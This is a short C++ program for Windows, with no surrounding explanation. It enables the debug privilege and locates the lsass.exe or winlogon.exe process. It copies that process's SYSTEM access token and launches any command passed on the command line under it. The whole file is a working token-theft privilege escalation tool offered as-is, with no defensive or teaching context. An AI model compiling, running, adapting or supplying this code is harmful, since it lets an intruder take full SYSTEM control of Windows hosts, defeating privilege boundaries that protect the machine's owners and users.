#include<windows.h>
#include<tlhelp32.h>
#include<iostream>


void tq(LPWSTR a)
{

    HANDLE hToken;
    LUID Luid;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = Luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);


    DWORD idL, idW;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (0 == _stricmp(pe.szExeFile, "lsass.exe")) {
                idL = pe.th32ProcessID;
            }
            else if (0 == _stricmp(pe.szExeFile, "winlogon.exe")) {
                idW = pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);


    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
    if (!hProcess)hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
    HANDLE hTokenx;

    OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);

    DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
    CloseHandle(hProcess);
    CloseHandle(hTokenx);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = L"winsta0\\default";

    CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, NULL, a, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
    CloseHandle(hToken);

}

PWSTR ConvertCharToLPWSTR(char* szString)

{

    int dwLen = strlen(szString) + 1;

    int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);//算出合适的长度

    LPWSTR lpszPath = new WCHAR[dwLen];

    MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);

    return lpszPath;

}
int main(int argc, char* argv[]) {
    tq(ConvertCharToLPWSTR(argv[1]));
   
   
}